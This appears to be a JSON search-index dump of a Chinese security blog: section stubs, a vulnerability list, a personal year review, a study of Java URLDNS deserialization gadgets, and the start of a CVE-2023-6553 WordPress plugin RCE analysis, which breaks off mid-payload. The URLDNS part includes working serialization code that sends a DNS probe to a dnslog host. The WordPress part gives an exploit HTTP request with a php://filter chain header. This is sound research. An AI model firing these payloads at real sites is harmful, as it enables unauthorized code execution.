[{"uri":"https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/","title":"Java Deserialization","tags":[],"description":"","content":"java反序列化 java 反序列化研究\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/encoding/","title":"Encoding","tags":[],"description":"","content":"编码 编码相关的文章\nUnicode utf-7 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/codeql/","title":"Codeql","tags":[],"description":"","content":"CODEQL 相关 记录codeql 学习 记录codeql 学习\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/linux/malware/","title":"Malware","tags":[],"description":"","content":"恶意软件 "},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/","title":"Windows CLFS EoP","tags":[],"description":"","content":"Windows CLFS 漏洞概览 序号 漏洞名 编号 类型 2 windows CLFS 权限提升漏洞 CVE-2023-28252 权限提升 1 windows CLFS 权限提升漏洞 CVE-2022-37969 权限提升 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/linux/","title":"Linux","tags":[],"description":"","content":"Linux Linux 相关研究 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/","title":"Windows","tags":[],"description":"","content":"windows Windows 相关研究 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/ntlm/","title":"NTLM 协议","tags":[],"description":"","content":"NTLM 协议 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/","title":"协议","tags":[],"description":"","content":"协议 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/","title":"Web","tags":[],"description":"","content":"Web web Web安全研究相关\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/","title":"代码审计","tags":[],"description":"","content":"代码审计 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/kerberos-in-windows/","title":"Windows中的kerberos协议","tags":[],"description":"","content":"Windows中的Kerberos协议 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/","title":"Kerberos 协议","tags":[],"description":"","content":"kerberos协议研究 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/dll-inject/","title":"Dll注入","tags":[],"description":"","content":"Dll注入研究 "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/socks/","title":"Socks协议","tags":[],"description":"","content":"Socks 协议 "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/","title":"隧道","tags":[],"description":"","content":"隧道 隧道相关文章\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/","title":"应用层隧道","tags":[],"description":"","content":"应用层隧道 "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/","title":"传输层隧道","tags":[],"description":"","content":"传输层隧道 "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/network-layer/","title":"网络层隧道","tags":[],"description":"","content":"网络层隧道 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/","title":"安全研究","tags":[],"description":"","content":"安全研究 记录安全研究相关文章\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/pe/","title":"Pe","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/","title":"漏洞分析","tags":[],"description":"","content":"漏洞分析 一些漏洞分析文章。\n序号 漏洞名 编号 类型 状态 42 ☐ 41 40 39 38 37 36 35 Wordpress Backup Migration plugin RCE CVE-2023-6553 代码执行 ✓ 34 AFP 远程代码执行漏洞 CVE-2022-23121 代码执行 ✓ 33 windows NTLM 权限提升漏洞 CVE-2023-21746 权限提升 ✗ 32 Apache Struts 远程代码执行漏洞 CVE-2023-50164 代码执行 ✓ 31 Apache Struts OGNL 远程代码执行漏洞 CVE-2020-17530 代码执行 ✓ 30 Linux polkit 权限提升漏洞 CVE-2021-4034 权限提升 ✓ 29 Windows 云文件迷你过滤驱动权限提升漏洞 CVE-2023-36036 权限提升 ✓ 28 wordpad 信息泄露漏洞 CVE-2023-36563 信息泄露 ✓ 27 squid 拒绝服务漏洞 QVD-2023-30699 拒绝服务 ✓ 26 Citrix Gateway 信息泄露漏洞 CVE-2023-4966 信息泄露 ✓ 25 http2 快速重置攻击 CVE-2023-44487 拒绝服务 ✓ 24 curl堆溢出漏洞 CVE-2023-38545 拒绝服务 ✓ 23 瑞友天翼 远程代码执行漏洞 QVD-2023-8621 代码执行 ✓ 22 libwebp 远程代码执行漏洞 CVE-2023-4863 代码执行 ✗ 21 jumpserver 任意密码重置漏洞 CVE-2023-42820 密码重置 ✓ 20 Winrar 代码执行漏洞 CVE-2023-38831 代码执行 ✓ 19 windows 错误报告服务代码执行漏洞 CVE-2023-36874 权限提升 ✓ 18 Windows ICS 权限提升漏洞 CVE-2023-38148 代码执行 ✓ 17 Cirtix Gateway RCE CVE-2023-3519 代码执行 ✓ 16 Openfire 身份认证绕过漏洞 CVE-2023-32315 身份认证绕过 ✓ 15 Smartbi RCE QVD-2023-5326 代码执行 ✓ 14 Windows CLFS 权限提升漏洞系列 权限提升 ✗ 13 gitlab 目录穿越漏洞 CVE-2023-2825 信息泄露 ✓ 12 zero logon分析 CVE-2020-1472 权限提升 ✓ 11 windows http.sys 权限提升漏洞 CVE-2023-23410 权限提升 ✓ 10 TerraMaster TOS代码执行漏洞 CVE-2022-24990 代码执行 ✗ 9 PgAdmin 代码执行漏洞 CVE-2022-4223 代码执行 ✓ 8 sudo权限提升漏洞 CVE-2021-3156 权限提升 ✗ 7 Minio信息泄露漏洞 CVE-2023-28432 信息泄露 ✓ 6 Strapi 代码执行漏洞链 代码执行 ✗ 5 Outlook 权限提升漏洞 CVE-2023-23397 权限提升 ✓ 4 OWASSRF 和 TabShell分析 CVE-2022-41080 CVE-2022-41076 代码执行 ✗ 3 proxy not shell 漏洞链 CVE-2022-41040 CVE-2022-41082 代码执行 ✗ 2 proxy shell 漏洞链 CVE-2021-34473 CVE-2021-34523 CVE-2021-31207 代码执行 ✗ 1 win32k 权限提升漏洞 CVE-2021-40449 权限提升 ✓ "},{"uri":"https://www.ch35tnut.site/zh-cn/","title":"首页","tags":[],"description":"","content":"学习记录 记录一些平时学习和生活的日常。\n01-05至01-08\r| 3 days ago\r研究了一下JAVA的URL DNS原理。\nJAVA URL DNS研究 2024\r12-29至12-29\r| 10 days ago\r填坑\nwindows CLFS 权限提升漏洞 CVE-2022-37969 windows CLFS 权限提升漏洞 CVE-2023-28252 Wordpress Backup Migration plugin RCE 2023\r12-05至12-06\r1 day | 34 days ago\r分析了CVE-2021-4034 polkit 权限提升漏洞，填坑。\npolkit 权限提升漏洞 2023\r11-30至12-01\r1 day | 39 days ago\r分析了CVE-2023-17530 Apache Struts OGNL 远程代码执行漏洞\nApache Struts OGNL 远程代码执行漏洞 2023\r11-20至11-25\r5 days | 49 days ago\r分析了在野利用的 CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞\nWindows Cloud Files Mini Filter Driver 权限提升漏洞 2023\r10-31至11-01\r1 day | 69 days ago\r分析了在野利用的wordpad 信息泄露漏洞\nwordpad 信息泄露漏洞 2023\r10-19至10-25\r6 days | 81 days ago\r分析了两个漏洞\nCitrix 信息泄露漏洞 squid 拒绝服务漏洞 2023\r10-14至10-15\r1 day | 86 days ago\r复现分析了curl 堆溢出漏洞\ncurl堆溢出漏洞 2023\r10-12至10-13\r1 day | 88 days ago\r复现分析了http2 快速重置攻击\nhttp rapid reset ddos attack 2023\r09-19至09-19\r| 111 days ago\r把之前写的文章整理到了博客\nwindows 错误报告服务权限提升漏洞 winrar 代码执行漏洞 2023\r09-14至09-18\r4 days | 116 days ago\r分析了以下9月补丁日的CVE-2023-38148, 分析文章：\nwindows ics rce 2023\r07-24至07-27\r3 days | 168 days ago\r前几天搭建Citrix ADC环境，实在是太难搭了，最后还是选择从公网找了个环境打了一下payload，diff了以下补丁，写了一个分析，可惜不能本地调试，看起来写exp应该挺简单的。分析见\ncitrix adc rce 更新：搭建了调试环境，调试了一下，更新在原链接\n2023\r09-13至09-16\r3 days | 482 days ago\r这周再写一个基于rust的loader，写了一半发现加载的dll太多了，再想办法用动态加载的方式加载dll，感觉用rust做有点难。\n用rust的内联汇编获取到了kernel32.dll和ntdll.dll的基址，还要继续完善。\n2022\r09-10至09-12\r2 days | 485 days ago\r中秋节，在家摸了几天🐟，啥都没干\n2022\r09-05至09-09\r4 days | 490 days ago\r这周编译了wireshark 1.8.5，通过diff1.8.5和1.8.6的源码找出1.8.5里面的漏洞，见\nwireshark 1.8.5代码审计 2022\r09-03至09-04\r1 day | 492 days ago\r这两天，给hugo主题增加了timeline的shortcode，见\n增加timeline功能 2022\r08-29至09-02\r4 days | 497 days ago\r周内看了一个几百行的代码，见\rnews_server审计\n2022\r黑客精神：Open, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/dailylife/","title":"生活随笔","tags":[],"description":"","content":"生活随笔 记录一些随笔文章。\n2023年终总结和2024展望 "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/","title":"杂项","tags":[],"description":"","content":"杂项 暂无\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/","title":"其他","tags":[],"description":"","content":"其他 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/","title":"JAVA URL DNS 研究","tags":["安全研究","反序列化"],"description":"","content":"前言\n初步入门java反序列化学习，做一个学习记录，水一篇文章。如果有问题可以邮件：got_\rwhipper.0p@icloud.com\nURL类DNS请求 使用URL.equals会发起DNS请求\npublic class urltest { public static void main(String[] args) throws MalformedURLException { System.out.println(\u0026#34;hello \u0026#34;); URL u = new URL(\u0026#34;http://www.baidu.com\u0026#34;); URL u1 = new URL(\u0026#34;http://www.baidu.com\u0026#34;); System.out.println(u.equals(u1)); } } 跟进代码，equals代码如下，\nprotected boolean equals(URL u1, URL u2) { String ref1 = u1.getRef(); String ref2 = u2.getRef(); return (ref1 == ref2 || (ref1 != null \u0026amp;\u0026amp; ref1.equals(ref2))) \u0026amp;\u0026amp; sameFile(u1, u2); } 判断reference是否相同，而后使用sameFile函数，sameFile函数会查看其协议、uri、端口、主机是否相等。\nprotected boolean sameFile(URL u1, URL u2) { // Compare the protocols. if (!((u1.getProtocol() == u2.getProtocol()) || (u1.getProtocol() != null \u0026amp;\u0026amp; u1.getProtocol().equalsIgnoreCase(u2.getProtocol())))) return false; // Compare the files. if (!(u1.getFile() == u2.getFile() || (u1.getFile() != null \u0026amp;\u0026amp; u1.getFile().equals(u2.getFile())))) return false; // Compare the ports. int port1, port2; port1 = (u1.getPort() != -1) ? u1.getPort() : u1.handler.getDefaultPort(); port2 = (u2.getPort() != -1) ? u2.getPort() : u2.handler.getDefaultPort(); if (port1 != port2) return false; // Compare the hosts. if (!hostsEqual(u1, u2)) return false; return true; } hostsEqual方法中会调用getHostAddress方法，getHostAddress方法会通过InetAddress.getByName函数获取到域名对应的IP地址，触发DNS解析\nprotected boolean hostsEqual(URL u1, URL u2) { InetAddress a1 = getHostAddress(u1); InetAddress a2 = getHostAddress(u2); protected synchronized InetAddress getHostAddress(URL u) { if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.isEmpty()) { return null; } else { try { u.hostAddress = InetAddress.getByName(host); } catch (UnknownHostException ex) { return null; } catch (SecurityException se) { return null; } } return u.hostAddress; } 同样的URL类中的hashCode也会触发DNS请求，通过getHostAddress获取到IP地址，需要注意的是其中hashCode会被缓存\npublic synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) { h += addr.hashCode(); } else { String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); } 通过调用URL类的equals和hashCode方法即可触发DNS请求\nHashMap原理 数据结构\nHashMap采用数组+链表方式存储键值对，其中链表为单向链表\ntransient Node\u0026lt;K,V\u0026gt;[] table; static class Node\u0026lt;K,V\u0026gt; implements Map.Entry\u0026lt;K,V\u0026gt; { final int hash; final K key; V value; Node\u0026lt;K,V\u0026gt; next; Node(int hash, K key, V value, Node\u0026lt;K,V\u0026gt; next) { this.hash = hash; this.key = key; this.value = value; this.next = next; } 默认情况下java中的HashMap大小只有16，当产生hash冲突时，就把它插入到链表中的下一个元素，在取出元素时，首先计算hash，根据hash找到对应的链表，而后遍历链表获取到value。\nstatic final int DEFAULT_INITIAL_CAPACITY = 1 \u0026lt;\u0026lt; 4; 可以用如下图 HashMap重写了readObject方法，反序列化HashMap数据时会调用重写的readObject方法，代码如下\nprivate void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); else if (mappings \u0026gt; 0) { // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 可以知道，readObject方法会获取有多少个数据，而后进行通过for循环循环从数据流中读取对象信息，并通过putVal方法加入到HashMap中，其中键为hash(key)，也就是会尝试调用key对应类的hashCode方法计算hash值。\nstatic final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } 如果key对象为URL类，通过前面我们知道URL.hashCode方法会触发DNS请求，这也是URLDNS的原理。\n以上代码来源于JDK 12.0.1\nhttps://cloud.tencent.com/developer/article/1167574\nhttps://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3\n实际测试\n使用如下代码进行测试\npublic class urltest { public static void main(String[] args) throws IOException, ClassNotFoundException { System.out.println(\u0026#34;hello \u0026#34;); URL u = new URL(\u0026#34;http://www.baidu.com/1\u0026#34;); URL u1 = new URL(\u0026#34;http://www.aliyun.com/1\u0026#34;); HashMap\u0026lt;URL,String\u0026gt; map = new HashMap\u0026lt;URL,String\u0026gt;(); map.put(u,\u0026#34;1\u0026#34;); map.put(u1,\u0026#34;1\u0026#34;); FileOutputStream fos = new FileOutputStream(\u0026#34;object\u0026#34;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将myObj对象写入object文件 os.writeObject(map); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\u0026#34;object\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 HashMap map2 = (HashMap\u0026lt;URL,String\u0026gt;)ois.readObject(); System.out.println(\u0026#34;finish\u0026#34;); ois.close(); } } 实际测试在从文件中反序列化恢复HashMap对象时不会触发DNS查询，跟进HashMap的readObject，有如下\nfor (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } 其中对K尝试调用readObject方法反序列化出对应的对象，其会调用到URL类的readObject方法，可以看到URL的readObject方法会尝试读取到hashCode并放入对象的hashCode属性\nprivate synchronized void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { GetField gf = s.readFields(); String protocol = (String)gf.get(\u0026#34;protocol\u0026#34;, null); if (getURLStreamHandler(protocol) == null) { throw new IOException(\u0026#34;unknown protocol: \u0026#34; + protocol); } String host = (String)gf.get(\u0026#34;host\u0026#34;, null); int port = gf.get(\u0026#34;port\u0026#34;, -1); String authority = (String)gf.get(\u0026#34;authority\u0026#34;, null); String file = (String)gf.get(\u0026#34;file\u0026#34;, null); String ref = (String)gf.get(\u0026#34;ref\u0026#34;, null); int hashCode = gf.get(\u0026#34;hashCode\u0026#34;, -1); if (authority == null \u0026amp;\u0026amp; ((host != null \u0026amp;\u0026amp; !host.isEmpty()) || port != -1)) { if (host == null) host = \u0026#34;\u0026#34;; authority = (port == -1) ? host : host + \u0026#34;:\u0026#34; + port; } tempState = new UrlDeserializedState(protocol, host, port, authority, file, ref, hashCode); } 而在序列化时，会调用HashMap.put方法，put方法会跟前面一样，调用hash方法计算hashCode，并放到对象内，序列化时hashCode就被保存了。\npublic V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 使得在调用URL.readObject方法时能够获取到hashCode，不会进行DNS解析。要解决这个问题就得让序列化后的数据hashCode为-1才能让hashCode方法调用到getHostAddress方法。 容易想到两种办法\n在put后，修改数据，把hashCode对应的数据置为-1，而后进行序列化 在数据放入HashMap时，通过反射直接调用putVal并把第一个参数设为-1 以下是两种办法的实现，\r来源于 public class URLDNS { public static void main(String[] args) throws Exception { HashMap\u0026lt;URL, Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://su18.dnslog.cn\u0026#34;); Field f = Class.forName(\u0026#34;java.net.URL\u0026#34;).getDeclaredField(\u0026#34;hashCode\u0026#34;); f.setAccessible(true); f.set(url, 0x01010101); hashMap.put(url, 0); f.set(url, -1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;urldns.bin\u0026#34;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;urldns.bin\u0026#34;)); ois.readObject(); } } public class URLDNS2 { public static void main(String[] args) throws Exception { HashMap\u0026lt;URL, Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://su18.dnslog.cn\u0026#34;); Method[] m = Class.forName(\u0026#34;java.util.HashMap\u0026#34;).getDeclaredMethods(); for (Method method : m) { if (method.getName().equals(\u0026#34;putVal\u0026#34;)) { method.setAccessible(true); method.invoke(hashMap, -1, url, 0, false, true); } } ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;urldns2.bin\u0026#34;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;urldns2.bin\u0026#34;)); ois.readObject(); } } ysoserial 实现URL DNS 下载\r源码,URLDNS实现如下，很明显采用的时第一种方法，在put之后，通过反射修改对应的值。\npublic class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } 参考链接\nhttps://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/\nhttps://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90\nCreated at 2024-01-08T16:57:37+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/tags/","title":"Tags","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/","title":"安全研究","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"反序列化","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/dailylife/2023-review-and-2024-outlook/","title":"2023 Review and 2024 Outlook","tags":[],"description":"","content":"前言 众所周知，时间在计算机内的表现形式只是一个时间戳，现实世界从2023-12-31 23:59到2024-01-01 00:00也只是在时间戳上增加了60000个毫秒。 从生理角度讲，跨年身体上也并不会出现太大的变化，所以即使新年定下了目标，更有可能的是2023年是怎么样2024年还是怎么样。\n这个文章比我想象中更难写，写了又删删了又写，到发布的时候距离2023.12.31已经过去了五天。\n但我认为做个一个阶段性的总结可以在未来回顾过去的时候有一个参考坐标。就像初中那会流行的非主流/大头贴以及那些发在QQ空间的颜文字和火星文，现在看来也非常有意思，算是曾经度过一段非主流岁月的佐证。 所以决定写下这个2023年的快照，等到2024.12.31的时候再回头看看2024年都做了什么。当然做一个整体回顾的话也不能避开那些做的不好的地方，虽然写下来感觉不太好意思，但还是决定试一试。​\n至于新年目标，我觉得可以分为硬性和软性目标，硬性目标订一些能够量化的、优先级高的，软性目标订一些难以定量的、优先级低的。年度目标定调太高容易完不成，反而容易产生既然完不成那就直接放弃的心态。 在完成既定目标的时候大脑会分泌多巴胺，这是人感觉到快乐的来源之一，跟之前成功分析漏洞、写出PoC的时候整个人会感到兴奋和快乐一样，这可以给自己一个正循环的反馈。\n2023总结 人回头审视自己做了什么总是艰难的，跟照镜子一样，照镜子的时候人脑会不自觉的修正脸部缺陷，做年度回顾的时候可能会下意识的忽略后者美化这一年做的不足的部分，以下可能是部分能尽力想起来的总结。 2022年末的时候其实并未正式制定2023年计划，以下是已经过去的2023完成的一些事项:\n大概花了一个月的晚上把吴思三部曲之二的《潜规则》看完了，重新读了一遍《血酬定律》。 公众号发表了十二篇技术性的文章，其中十一篇漏洞分析，一篇研究文章，公众号涨到粉丝214。 经过大约七个月的打卡，单词词汇量一千左右。 把博客运营起来了，现在已有二三十篇文章。 做了一下有价值的工作，输出了有价值的内容。 当然除了上面那些，还有未完成的部分：\n年中的时候想着去练点肌肉，结果每次还是懒得去，结果到年末还是没练起来，虽然整个人偏瘦，但肚子上还是有赘肉，连每日跑步也很久没去了。 单词部分，有的时候会偷懒，打个卡就完事了，导致到现在打卡了200天，单词量只有一千左右。 一些文章链接一直躺在浏览器、feed软件里面，一直没看。 然后技术部分，如下图，大概还有9篇遗留漏洞分析的没有整理到博客，其实之前都看完了来着，一直想整理但一直偷懒，然后可能得重新看了。 对于2023大概能回忆到这些，2023做的好和不好都已经过去了，沉迷于过去没有任何意义。对我来说2023年变化较大的一年，兔年是我第二个本命年，第一次意识到离30岁是如此接近，在我的感觉中好像距离大学毕业也没多久，回头一看也快三年了。作为一个血统纯正的南方人，其实在北方过的并不算习惯，以前我在南方生活的时候，春天天下雨，但北京春天的时候不下雨以至于有点不习惯。饮食方面，作为江西人只能偶尔吃一吃湘菜聊以慰籍了，虽然赣菜很好吃，但不得不承认在外面还是湘菜做的最合口味，但最痛苦的是我是易得口腔溃疡的体质，有一次连吃两顿湘菜过了两天就长了几个口腔溃疡，折磨了两个礼拜才好。\n北京相比于南方最好的地方就是，冬天有暖气，呆在屋里一点都不冷，每年回家过年的时候，下雨加上0度的天气，让人躲在被窝里还是浑身冰冷。\n2024展望 大概还有不到一个月就要离开呆了三年的北京，去杭州做一些和现在不一样的 、更有挑战性的工作，挺期待新一年的工作。展望一下2024年，下面是一些初步拟定的目标：\n硬性目标\n到2024年末词汇量能到达2500，争取每天背20个，复习20个单词。 多写一些安全研究的文章，现有的文章大部分是漏洞分析，希望2024年可以达到一比一吧，另外2024年希望可以写20-30篇文章。 到2024年末增重到130斤。 把之前欠下的债完结了，把浏览器存的tab和Instapaper里面存的文章看完。 学习fuzz。 看20个电影和5本书，多丰富丰富大脑。 软性目标\n精进使用AI的能力，之前用AI的方法还是太粗糙了，感觉效果没那么好。 熟练掌握CodeQL进行代码审计。 希望公众号粉丝能破五百个，我写文章不会在其他群和朋友圈引流，都是随缘让系统推荐，虽然现在已经有了两百多了，希望到年底能翻倍。 下降看短视频时长和和手机使用时长，多看看文章和书。 希望新的一年能有更多成长吧，时间越走越快，距离30岁只剩5年，希望可以成为top researcher.\n题外话 写到后面发现确实不太擅长写这类文章，脑子里很多想写的，但到键盘上就是打不出来，完全没有写分析文章的那种感觉，可能是书读少了，每天只看一些零零散散的内容，脑子里面没货，文笔生硬，希望将来可以改善。\n有一个黑客心，也希望可以一直保持一个好奇心，多做一些有挑战的，别人做不到的事情。\n2024年1月5日。\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/","title":"CVE 2023 6553 Wordpress Backup Migration Plugin RCE","tags":[],"description":"","content":"基本信息 WordPress 的备份迁移插件的/includes/backup-heart.php 文件。这是由于攻击者能够控制传递给包含的值，并随后利用该值实现远程代码执行。\n影响版本 Backup Migration \u0026lt;= 1.3.7 环境搭建 参考\rhttps://github.com/docker/awesome-compose/tree/master/official-documentation-samples/wordpress/使用docker启动\n下载插件并启用 https://downloads.wordpress.org/plugin/backup-backup.1.3.7.zip\n技术分析\u0026amp;调试 查看\r补丁可知通过控制HTTP头，可以控制后面require_once的参数，即攻击者可以通过控制HTTP头控制require_once的参数。\n参考\rPHP filter 代码执行\npoc地址https://github.com/synacktiv/php_filter_chain_generator\nPOST /wp-content/plugins/backup-backup/includes/backup-heart.php HTTP/1.1 Host: 192.168.59.211 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.59.211/wp-admin/ Connection: close Cookie: wordpress_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Ca6e8acc150f152d2b5aa4d373e5ff828187efd0c9e212eab25859d55778a52e2; i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node019bmeisxrr5jql3o20jv87og13.node0; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Cb3a0f6ea3e6536b5e606de98a800e4156008295e564a757f1b36ed6a8077c9f7; wp-settings-time-1=1702463992 Upgrade-Insecure-Requests: 1 content-dir: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|conver